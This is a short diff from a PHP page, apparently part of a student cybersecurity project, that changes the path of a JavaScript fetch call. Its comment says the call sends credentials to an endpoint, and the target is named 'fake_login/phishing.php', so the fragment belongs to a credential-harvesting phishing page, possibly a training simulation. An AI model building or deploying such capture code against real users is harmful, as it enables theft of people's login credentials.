@@ -160,7 +160,7 @@ $sender_id = isset($_GET['sender']) ? intval($_GET['sender']) : 0;
             const senderId = <?php echo json_encode($sender_id); ?>;
             
             // Envoyer les identifiants au endpoint
-            fetch('/messagerie/codes/fake_login/phishing.php', {
+            fetch('/projects/MDI/cyber-securite/messagerie/codes/fake_login/phishing.php', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
